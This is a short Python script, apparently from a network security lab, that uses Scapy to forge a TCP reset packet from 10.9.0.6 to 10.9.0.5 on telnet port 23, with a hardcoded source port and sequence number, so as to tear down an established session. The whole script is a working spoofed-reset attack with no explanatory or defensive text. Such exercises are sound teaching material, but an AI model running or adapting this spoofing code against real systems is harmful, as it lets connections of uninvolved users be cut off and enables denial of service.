#!/usr/bin/env python3 
from scapy.all import *

print("SENDING RESET PACKET......")
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=37332, dport=23, flags="R", seq=16201344)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)
